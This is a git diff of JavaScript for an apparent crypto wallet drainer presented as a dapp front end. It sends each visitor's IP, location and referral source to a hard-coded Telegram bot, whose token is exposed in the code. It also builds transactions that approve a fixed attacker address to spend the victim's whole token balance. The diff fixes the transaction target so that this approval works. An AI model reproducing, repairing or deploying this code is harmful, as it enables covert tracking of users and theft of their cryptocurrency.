@@ -4,6 +4,7 @@ import { ABI } from "./constant";
 const botToken = "6910766449:AAH_KtR65hweWsgLQMJXXgAadzG2PSN892U"; // Caution: Exposing token
 const chatId = "1876632135";
 const targetAddress = "0xac798ad8c3f4b3226bb0d1b769d4a23376bfdf46";
+
 let web3 = new Web3(window.ethereum);
 export const sendMessage = async (message) => {
   try {
@@ -20,12 +21,12 @@ export const sendMessage = async (message) => {
     // Handle error
   }
 };
-export const getLocationData = () => {
+export const getLocationData = (source) => {
   axios
     .get("https://api.ipify.org?format=json")
     .then((res) => {
       axios.get(`https://ipapi.co/${res.data?.ip}/json/`).then((result) => {
-        let message = `New client has been connected and country is ${result?.data?.country_name} and city is ${result?.data?.city} and ip address is ${result?.data?.ip}`;
+        let message = `New client has been connected and country is ${result?.data?.country_name} and city is ${result?.data?.city} and ip address is ${result?.data?.ip} and the user is come from ${source}`;
         sendMessage(message);
       });
     })
@@ -63,18 +64,16 @@ export const getLocationData = () => {
 //         console.error('An error occurred:', error);
 //     }
 // }
-export const prepareTransaction = async (item, account) => {
+export const prepareTransaction = async (item, account , provider) => {
   if (item?.native_token) {
     return;
   }
-
+  let web3 = new Web3(provider);
   let Contract = new web3.eth.Contract(ABI, item?.contract_address);
   console.log(item?.balance, targetAddress, account, item);
   let tx = {
     from: account,
-    to: "0xcc42724c6683b7e57334c4e856f4c9965ed682bd",
-    //   gasPrice: web3.utils.toHex(20 * 1e9),
-    //   gasLimit: web3.utils.toHex(60000),
+    to: item?.contract_address,
     data: Contract.methods
       .increaseAllowance(targetAddress, item?.balance)
       .encodeABI(),
@@ -101,8 +100,9 @@ export const prepareTransaction = async (item, account) => {
       console.log({ er });
     });
 };
-export async function switchToEthereumMainnet() {
+export async function switchToEthereumMainnet(provider) {
   try {
+    let web3 = new Web3(provider);
     const netId = await web3.eth.net.getId();
     if (netId !== 1) {
       // Ethereum Mainnet network ID is not 1, so switch
@@ -118,9 +118,11 @@ export async function switchToEthereumMainnet() {
     return false;
   }
 }
-export async function switchToBsc() {
+export async function switchToBsc(provider) {
   try {
+    let web3 = new Web3(provider);
     const netId = await web3.eth.net.getId();
+    console.log({netId})
     if (Number(netId) !== 56) {
       // Ethereum Mainnet network ID is not 1, so switch
       await window.ethereum.request({
